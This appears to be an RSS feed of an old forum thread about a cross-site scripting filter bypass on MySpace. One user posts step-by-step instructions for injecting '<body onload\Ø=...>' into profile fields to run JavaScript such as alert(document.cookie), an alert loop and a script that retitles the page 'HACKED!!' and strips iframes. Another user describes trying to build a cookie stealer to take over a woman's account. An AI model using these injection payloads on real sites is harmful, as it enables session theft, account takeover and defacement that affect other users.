channel.title: MySpace XSS (firefocks only)
channel.description:
alright step one
[ul][li]goto into your mySpace[/li] [li]edit your "Interests and Personality thing"[/li] [li]put in one of the boxes....[/li] [li]<body onload\Ø="alert(document.cookie)">[/li][/ul]
and it doesn't have to stop at cookies! it can be
[code] <body onload\Ø=" for (var x = 1; x <= 10; x++) alert('ARGHHH BOXES!!!!!!') "> [/code]
or any old JavaScript for that matter....
[u][b]EXTERNAL LINKS[/b][/u] [url=http://sla.ckers.org/forum/read.php?3,4086]http://sla.ckers.org/forum/read.php?3,4086[/url]

item.title: MySpace XSS (firefocks only)
item.dc:creator: @Mopman Mopman
item.description:
@Mopman wrote:

According to Wikipedia, you’re right

I always assumed cross-site scripting had to be… well y’know… cross-site. So, if you made use of that filter exploit to run a script hosted on your server that saved all the users cookies, that would be XSS.

I was wrong though, even popping up an alert() is considered XSS… crazy terminology.

Read full topic

item.title: MySpace XSS (firefocks only)
item.dc:creator: @marluxia marluxia
item.description:
@marluxia wrote:

Oh… Well good point… but isn’t cross scripting just enabling arbitrary code execution where it shouldn’t be? I mean it doesn’t have to be malicious it can be anything… right? Well anyways it was just an example I don’t really care for cookies

Adblock

<body onload..Ø="

document.title = 'HACKED!!';

killTags('I' + 'FRAME');

function killTags(tag) {
  var badstyles = document.getElementsByTagName(tag);
  var i = badstyles.length - 1;
         while (i >= 0) {
              badstyles[i] =                                 
         badstyles[i].parentNode.removeChild(badstyles[i]);
         i--;
  }
}

">

Read full topic

item.title: MySpace XSS (firefocks only)
item.dc:creator: @Mopman Mopman
item.description:
@Mopman wrote:

Well it’s filter evasion, yes.
But where is the cross-site scripting?

I’m no expert on this, but it’s a lot harder than you imagine to steal cookies etc. with this Well, nicely anyway. I set up a profile the other day to mess about on and tried to write a cookie stealer using XMLHttpRequest (the transport method most AJAX applications use) and it appears modern browsers won’t make connections out to servers they’re not explicitly browsing to, so it was a waste of an hour of my life and I never got that fit birds myspace account.

Read full topic

item.title: MySpace XSS (firefocks only)
item.dc:creator: @marluxia marluxia
item.description:
@marluxia wrote:

alright step one

[ul][li]goto into your mySpace[/li]
[li]edit your “Interests and Personality thing”[/li]
[li]put in one of the boxes…[/li]
[li]<body onload\Ø=“alert(document.cookie)”>[/li][/ul]

and it doesn’t have to stop at cookies! it can be

<body onload\Ø="
for (var x = 1; x <= 10; x++)
     alert('ARGHHH BOXES!!!!!!')   
">

or any old JavaScript for that matter…

http://sla.ckers.org/forum/read.php?3,4086
